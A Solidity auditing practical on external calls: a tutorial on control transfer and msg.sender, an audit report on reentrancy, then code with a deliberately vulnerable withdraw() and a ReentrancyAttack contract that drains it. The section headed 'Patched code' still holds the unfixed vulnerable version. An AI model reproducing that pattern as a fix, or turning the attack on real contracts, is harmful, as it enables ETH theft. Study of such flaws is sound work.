// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/*
=========================================================
PRACTICAL: Trace external call execution
CONCEPT: Control transfer awareness
=========================================================

OBJECTIVE

- Learn how execution control moves externally
- Understand execution-context switching
- Trace msg.sender across contracts
- Think like auditor during external interactions

---------------------------------------------------------
CORE IDEA
---------------------------------------------------------

When Contract A calls Contract B:

execution control LEAVES A
and ENTERS B.

---------------------------------------------------------

This is one of the MOST IMPORTANT
security concepts in Solidity.

---------------------------------------------------------
IMPORTANT UNDERSTANDING
---------------------------------------------------------

External calls are NOT normal jumps.

---------------------------------------------------------

Execution temporarily transfers to:

UNTRUSTED CODE.

---------------------------------------------------------

The called contract controls execution flow
until it returns or reverts.

---------------------------------------------------------
WHY THIS MATTERS
---------------------------------------------------------

Most Solidity vulnerabilities involve:

- external execution
- reentrancy
- callback attacks
- malicious contracts
- trust assumptions

---------------------------------------------------------
REAL-WORLD USAGE
---------------------------------------------------------

External calls exist in:

- token transfers
- swaps
- lending protocols
- NFT marketplaces
- staking systems
- bridges

---------------------------------------------------------
AUDITOR FOCUS
---------------------------------------------------------

Auditors trace:

- execution switching
- msg.sender transitions
- state before/after calls
- reentrancy windows
- callback opportunities

=========================================================
TARGET CONTRACT
=========================================================
*/
/*
contract ExternalTarget {

    /*
        STORE LAST CALLER
    
    address public lastCaller;

    /*
        TRACK EXECUTIONS
    
    uint256 public executionCounter;

    /*
    =====================================================
    TARGET FUNCTION
    =====================================================
    

    function targetFunction()
        external
    {

        /*
        =================================================
        EXECUTION CONTEXT NOW INSIDE TARGET CONTRACT
        =================================================

        msg.sender becomes:
        calling contract address.
        

        lastCaller = msg.sender;

        /*
            Increment execution count.
        
        executionCounter++;
    }
}

/*
=========================================================
CALLER CONTRACT
=========================================================


contract ExecutionTracer {

    /*
        TARGET CONTRACT REFERENCE
    
    ExternalTarget public target;

    /*
        LOCAL EXECUTION TRACKING
    
    uint256 public localCounter;

    /*
        TRACK EXECUTION STEPS
    
    string public executionStage;

    /*
        TRACK LAST msg.sender
    
    address public lastObservedSender;

    /*
        CONSTRUCTOR
    
    constructor(address _target)
    {

        /*
            Save target contract.
        
        target = ExternalTarget(_target);
    }

    /*
    =====================================================
    TRACE EXTERNAL EXECUTION
    =====================================================
    

    function traceExecution()
        external
    {

        /*
        =================================================
        STEP 1
        =================================================

        Execution currently inside:
        ExecutionTracer contract.
        

        executionStage =
            "Before external call";

        /*
            msg.sender here:
            ORIGINAL USER.
        
        lastObservedSender =
            msg.sender;

        /*
            Local state update.
        
        localCounter++;

        /*
        =================================================
        STEP 2
        =================================================

        EXTERNAL CALL HAPPENS HERE.

        CONTROL LEAVES:
        ExecutionTracer

        CONTROL ENTERS:
        ExternalTarget
        

        target.targetFunction();

        /*
        =================================================
        STEP 3
        =================================================

        External execution finished.

        CONTROL RETURNS:
        back to ExecutionTracer.
        

        executionStage =
            "After external call";
    }
}
*/
/*
=========================================================
EXECUTION FLOW
=========================================================

STEP 1:
Deploy ExternalTarget

---------------------------------------------------------

STEP 2:
Deploy ExecutionTracer

Constructor input:
ExternalTarget address

=========================================================
TRACE:
traceExecution()
=========================================================

STEP 1:
User calls:

traceExecution()

=========================================================
STEP 2
=========================================================

Execution enters:
ExecutionTracer

---------------------------------------------------------

Current contract:
ExecutionTracer

---------------------------------------------------------

msg.sender:
ORIGINAL USER

=========================================================
STEP 3
=========================================================

executionStage =
"Before external call"

---------------------------------------------------------

localCounter++

=========================================================
STEP 4
=========================================================

CRITICAL MOMENT:

target.targetFunction()

=========================================================
IMPORTANT
=========================================================

CONTROL LEAVES:
ExecutionTracer

---------------------------------------------------------

Execution CONTEXT switches externally.

=========================================================
STEP 5
=========================================================

Execution enters:
ExternalTarget

---------------------------------------------------------

Current contract:
ExternalTarget

=========================================================
IMPORTANT msg.sender CHANGE
=========================================================

Inside ExternalTarget:

msg.sender =
ExecutionTracer contract

---------------------------------------------------------

NOT original user.

=========================================================
STEP 6
=========================================================

ExternalTarget executes:

---------------------------------------------------------

lastCaller = ExecutionTracer

---------------------------------------------------------

executionCounter++

=========================================================
STEP 7
=========================================================

ExternalTarget finishes execution.

---------------------------------------------------------

CONTROL RETURNS:
ExecutionTracer

=========================================================
STEP 8
=========================================================

Execution continues AFTER external call.

---------------------------------------------------------

executionStage =
"After external call"

=========================================================
FINAL RESULT
=========================================================

---------------------------------------------------------
ExecutionTracer.localCounter
---------------------------------------------------------

1

---------------------------------------------------------
ExternalTarget.executionCounter
---------------------------------------------------------

1

---------------------------------------------------------
ExternalTarget.lastCaller
---------------------------------------------------------

ExecutionTracer address

=========================================================
CRITICAL SECURITY UNDERSTANDING
=========================================================

During external call:

---------------------------------------------------------
YOUR CONTRACT STOPS EXECUTING
---------------------------------------------------------

and

---------------------------------------------------------
ANOTHER CONTRACT TAKES CONTROL
---------------------------------------------------------

=========================================================
THIS IS DANGEROUS BECAUSE
=========================================================

External contract may:

- revert
- reenter
- consume gas
- manipulate execution
- attack assumptions

=========================================================
VERY IMPORTANT AUDITOR MINDSET
=========================================================

Every external call means:

---------------------------------------------------------
TRUSTING UNKNOWN EXECUTION
---------------------------------------------------------

=========================================================
CONTROL TRANSFER VISUALIZATION
=========================================================

User
  |
  v
ExecutionTracer
  |
  | external call
  v
ExternalTarget
  |
  | return
  v
ExecutionTracer resumes

=========================================================
REMIX TESTING
=========================================================

STEP 1:
Deploy ExternalTarget

---------------------------------------------------------

STEP 2:
Deploy ExecutionTracer

Input:
ExternalTarget address

---------------------------------------------------------

STEP 3:
Call:
traceExecution()

=========================================================
STEP 4
=========================================================

Check:
executionStage()

EXPECTED:
"After external call"

=========================================================
STEP 5
=========================================================

Check:
localCounter()

EXPECTED:
1

=========================================================
STEP 6
=========================================================

Open ExternalTarget

---------------------------------------------------------

Check:
executionCounter()

EXPECTED:
1

---------------------------------------------------------

Check:
lastCaller()

EXPECTED:
ExecutionTracer address

=========================================================
IMPORTANT SECURITY CONCEPT
=========================================================

External calls create:

---------------------------------------------------------
EXECUTION BOUNDARIES
---------------------------------------------------------

and

---------------------------------------------------------
TRUST BOUNDARIES
---------------------------------------------------------

=========================================================
COMMON AUDIT RISKS
=========================================================

---------------------------------------------------------
1. REENTRANCY
---------------------------------------------------------

External contract calls back unexpectedly.

---------------------------------------------------------
2. msg.sender CONFUSION
---------------------------------------------------------

Authentication assumptions fail.

---------------------------------------------------------
3. FAILURE PROPAGATION
---------------------------------------------------------

External revert breaks execution.

---------------------------------------------------------
4. MALICIOUS CALLBACKS
---------------------------------------------------------

Execution flow manipulated externally.

=========================================================
IMPORTANT ATTACK THINKING
=========================================================

Attackers abuse:

- external execution windows
- callback opportunities
- temporary state exposure
- trust assumptions

=========================================================
REAL AUDITOR PROCESS
=========================================================

Auditors trace:

1. Every external jump
2. Control-transfer timing
3. State before call
4. State after call
5. Reentrancy possibilities

=========================================================
WHY CONTROL TRANSFER IS CRITICAL
=========================================================

Most major Solidity exploits happen
during external execution.

---------------------------------------------------------

Understanding control transfer
is foundational for auditing.

=========================================================
MINI CHALLENGE
=========================================================

Modify contracts so that:

1. Add ETH transfer
2. Add malicious callback
3. Add reentrancy attack
4. Add nested external chain

BONUS:
Trace execution using Remix debugger.

=========================================================
IMPORTANT CONCEPTS LEARNED
=========================================================

- External calls transfer execution control
- msg.sender changes during nested calls
- Contracts temporarily stop execution
- External contracts are untrusted
- Control eventually returns after execution
- Reentrancy occurs during external execution
- Auditors trace every external jump
- Execution context changes externally
- External calls create attack surface
- Control-transfer awareness is critical for auditing

=========================================================
*/
/*
Audit Report
Title
Reentrancy Vulnerability via External Call Before state Protection

Severity:High

Reason
The modified execution flow introduces ETH transfers and external calls thatcan
be exploited through malicious callback contracts, allowing reentrant execution
and unexpected state manipulation.

Location
Contract: ExecutionTracer
Function: traceExecution() /ETH withdrawl logic

Vulnerability Description
After introducing ETH transfers and nested external calls, execution flow
becomes:
ExecutionTracer -> ExternalTarget -> MaliciousCallback -> ExecutionTracer (re-entered)
if state changes are performed after external calls, an attacker can e-enter the 
contract before execution completes.
Example vulnerable pattern
(bool success, ) =
       attacker.call{vlue: amount}("");
    require(success);
    localCounter++;
    The external call gives control to an attacker contract before internal state is
    finalized

Impact
An attacker may:
1. RE-enter execution flow
2. Trigger multiple executions
3. Drain ETH repeatedly
4. Corrupt accounting
5. Bypass intended execution sequence

Potential consequnces:
1. Unauthorized ETH withdrawls
2. Multiple execution of critical logic
3. Incorrect state transitions
4. Denial of service

Proof of concept

Step 1
Deploy:
ExecutionTracer
ExternalTarget
MaliciousCallback

Step 2
Fund ExecutionTracer.

Step 3
Attacker calls:
attack()

Step 4
Execution flow:
ExecutionTracer.traceExecution()
    ↓
ExternalTarget.targetFunction()
    ↓
MaliciousCallback.receive()
    ↓
ExecutionTracer.traceExecution()

Step 5
Reentrant calls execute repeatedly before original execution completes.

Root Cause
The contract performs external interactions before fully securing internal state.
target.targetFunction();
and
receiver.call{value: amount}("");
allow execution control to leave the contract.
//CHECKS

//EFFECTS
localCounter++;

//INTERACTIONS
(bool success, ) = 
receiver.call{value: amount}("");

use:

ReentrancyGuard
or a mutex lock.

Patched code
*/
contract ExternalTarget {

    address public lastCaller;
    uint256 public executionCounter;

    function targetFunction()
        external
    {
        lastCaller = msg.sender;
        executionCounter++;
    }
}

/*
=========================================================
NESTED EXTERNAL CHAIN
=========================================================
*/
contract ChainB {

    uint256 public chainCounter;

    function chainCall()
        external
    {
        chainCounter++;
    }
}

/*
=========================================================
CALLER CONTRACT
=========================================================
*/
contract ExecutionTracer {

    ExternalTarget public target;
    ChainB public chain;

    uint256 public localCounter;
    string public executionStage;

    constructor(
        address _target,
        address _chain
    )
    {
        target = ExternalTarget(_target);
        chain = ChainB(_chain);
    }

    /*
    =====================================================
    1. ETH TRANSFER
    =====================================================
    */
    function traceExecution()
        external
        payable
    {
        executionStage =
            "Before external call";

        localCounter++;

        // External call
        target.targetFunction();

        // 4. Nested external chain
        chain.chainCall();

        executionStage =
            "After external call";
    }

    /*
    =====================================================
    VULNERABLE WITHDRAW
    =====================================================
    */
    function withdraw()
        external
    {
        uint256 amount =
            address(this).balance;

        // Vulnerable ETH transfer
        (bool success, ) =
            msg.sender.call{
                value: amount
            }("");

        require(success);

        // State update after call
        localCounter++;
    }

    receive() external payable {}
}

/*
=========================================================
2. MALICIOUS CALLBACK
=========================================================
*/
contract MaliciousCallback {

    uint256 public callbackCount;

    receive()
        external
        payable
    {
        callbackCount++;
    }
}

/*
=========================================================
3. REENTRANCY ATTACK
=========================================================
*/
contract ReentrancyAttack {

    ExecutionTracer public victim;

    constructor(
        address _victim
    )
    {
        victim =
            ExecutionTracer(
                payable(_victim)
            );
    }

    function attack()
        external
        payable
    {
        victim.withdraw();
    }

    receive()
        external
        payable
    {
        if (
            address(victim).balance > 0
        ) {
            victim.withdraw();
        }
    }
}